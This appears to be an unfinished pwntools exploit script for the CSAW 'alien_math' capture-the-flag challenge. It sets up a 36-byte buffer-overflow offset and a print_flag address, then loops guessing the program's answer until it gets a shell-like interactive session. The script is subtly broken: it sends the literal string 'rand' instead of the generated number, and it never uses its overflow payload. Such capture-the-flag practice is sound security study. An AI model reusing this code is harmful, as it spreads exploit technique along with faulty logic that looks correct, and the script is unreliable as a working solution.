#!/usr/bin/env python3

import random
from pwn import *

context.binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
print_flag = p64(0x4014fb)
OFFSET = 36
junk = b"A" * OFFSET

while True:
    #p = remote('pwn.chal.csaw.io', 5004, ssl=False)
    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
        
    leak = p.recvuntil(b"What is the square root of zopnol?").strip()
    log.info(f"{leak = }")
    rand = random.randint(-2147483648, 2147483647)
    p.sendline(b"rand")
    log.info(f"{rand = }")
    leak = p.recvline()
    log.info(f"{leak = }")
    leak = p.recvline()
    log.info(f"{leak = }")
    #if leak == b"Incorrect. That's an F for you!\n":  Test if you can directly compare byte values (you can)
    if leak == b"Correct!\n":
        False
        p.interactive()
    else:
        p.kill()
